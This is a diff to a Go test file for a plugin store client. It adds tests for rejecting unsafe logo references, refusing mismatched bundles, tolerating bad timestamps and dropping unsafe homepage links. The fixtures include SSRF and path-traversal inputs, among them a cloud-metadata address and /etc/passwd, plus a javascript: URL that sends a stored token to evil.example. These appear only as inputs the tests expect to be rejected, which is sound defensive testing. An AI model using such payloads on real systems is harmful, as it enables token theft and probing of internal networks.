@@ -12,6 +12,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync/atomic"
 	"testing"
@@ -346,13 +347,20 @@ func storeManager(t *testing.T, f *fakeStore) *Manager {
 	return m
 }
 
-// serveBundle points the fake store's sample plugin at a real zip with the given manifest.
+// serveBundle points the fake store's sample plugin at a real zip with the given manifest. The
+// card is filled in from the manifest, because that is what a store built by add_release.py does.
 func (f *fakeStore) serveBundle(t *testing.T, id, manifest string) StorePlugin {
 	t.Helper()
 	f.bundle = zipBundle(t, map[string]string{"plugin.yaml": manifest, "run.sh": "#!/bin/sh\nsleep 60\n"},
 		map[string]os.FileMode{"run.sh": 0o755})
+	man, err := ParseManifest([]byte(manifest))
+	if err != nil {
+		t.Fatal(err)
+	}
 	p := f.samplePlugin()
-	p.ID = id
+	p.ID, p.Name = id, man.Name
+	p.Permissions = man.Permissions
+	p.Latest.Version = man.Version
 	f.setIndex(t, p)
 	return p
 }
@@ -502,5 +510,106 @@ func TestStoreIgnoresACacheFromADifferentStore(t *testing.T) {
 	}
 	if second.notMod.Load() != 0 {
 		t.Error("the old store's ETag was sent to the new store")
+	}
+}
+
+func TestLogoRefsCannotLeaveTheStore(t *testing.T) {
+	// The daemon fetches these itself, from inside the operator's network, and hands the bytes to
+	// their browser. An index must not be able to point that anywhere it likes.
+	s := NewStore("https://example.invalid/store/index.json", t.TempDir(), "0.3.3")
+	for _, ref := range []string{
+		"http://192.168.1.1/status.png",           // another host, plaintext
+		"https://169.254.169.254/meta-data/x.png", // cloud metadata
+		"//169.254.169.254/meta-data/x.png",       // scheme-relative: not IsAbs, still changes host
+		"/../../../evil/x.svg",                    // climbs above the index's folder
+		"../../etc/passwd.png",                    // the same, relatively
+		"file:///etc/passwd",                      // not http at all
+	} {
+		if got, err := s.resolve(ref); err == nil {
+			t.Errorf("resolve(%q) allowed %q", ref, got)
+		}
+	}
+	// A logo beside the index is what this is for.
+	got, err := s.resolve("logos/x.png")
+	if err != nil || got != "https://example.invalid/store/logos/x.png" {
+		t.Errorf("resolve of a normal logo: %q, %v", got, err)
+	}
+}
+
+func TestInstallFromStoreRefusesABundleThatDisagreesWithTheCard(t *testing.T) {
+	// The card is what the operator read before pressing Install. A bundle that asks for more
+	// than it said, or isn't the version it offered, is refused rather than quietly installed.
+	cases := map[string]struct {
+		card func(*StorePlugin)
+		want string
+	}{
+		"a different version": {
+			func(p *StorePlugin) { p.Latest.Version = "9.9.9" },
+			"but the bundle is 0.2.0",
+		},
+		"permissions the card didn't list": {
+			func(p *StorePlugin) { p.Permissions = []string{} },
+			"the bundle also asks for packets.read",
+		},
+	}
+	for name, c := range cases {
+		t.Run(name, func(t *testing.T) {
+			f := newFakeStore(t)
+			p := f.serveBundle(t, "shopbought", storeManifest)
+			c.card(&p)
+			f.setIndex(t, p)
+			m := storeManager(t, f)
+
+			_, err := m.InstallFromStore(context.Background(), "shopbought")
+			if err == nil {
+				t.Fatal("it was installed anyway")
+			}
+			if !strings.Contains(err.Error(), c.want) || !strings.Contains(err.Error(), "not installed") {
+				t.Errorf("the error should say what disagreed, got %v", err)
+			}
+			if _, err := m.Get("shopbought"); err == nil {
+				t.Error("it reached the installed plugins")
+			}
+		})
+	}
+}
+
+func TestOneBadDateDoesNotEmptyTheStore(t *testing.T) {
+	// encoding/json fails the whole document when a time.Time won't parse, so a hand-edited
+	// timestamp would otherwise cost the reader every plugin in the file.
+	f := newFakeStore(t)
+	p := f.samplePlugin()
+	raw := `{"version":1,"updated":"2026-09-18 17:11:15","plugins":[
+	  {"id":"meshflow","name":"Meshflow","summary":"x","author":"y","homepage":"https://example.invalid",
+	   "license":"GPL-3.0-or-later","permissions":[],
+	   "latest":{"version":"` + p.Latest.Version + `","api":1,"released":"whenever","url":"` + p.Latest.URL +
+		`","sha256":"` + p.Latest.SHA256 + `","size":` + strconv.FormatInt(p.Latest.Size, 10) + `,"arches":["` + thisArch() + `"]}}]}`
+	f.index.Store([]byte(raw))
+
+	idx, err := newTestStore(t, f).Index(context.Background(), false)
+	if err != nil {
+		t.Fatalf("a bad timestamp should not fail the index: %v", err)
+	}
+	if len(idx.Plugins) != 1 {
+		t.Fatalf("wanted the plugin listed anyway, got %v", pluginIDs(idx))
+	}
+	if !idx.Updated.IsZero() || !idx.Plugins[0].Latest.Released.IsZero() {
+		t.Error("an unparseable timestamp should read as no timestamp")
+	}
+}
+
+func TestAJavascriptHomepageIsDropped(t *testing.T) {
+	// The GUI renders this as a link in its own page.
+	f := newFakeStore(t)
+	p := f.samplePlugin()
+	p.Homepage = "javascript:fetch('https://evil.example/'+localStorage.getItem('rt-token'))"
+	f.setIndex(t, p)
+
+	idx, err := newTestStore(t, f).Index(context.Background(), false)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := idx.Plugins[0].Homepage; got != "" {
+		t.Errorf("a non-https homepage reached the GUI: %q", got)
 	}
 }
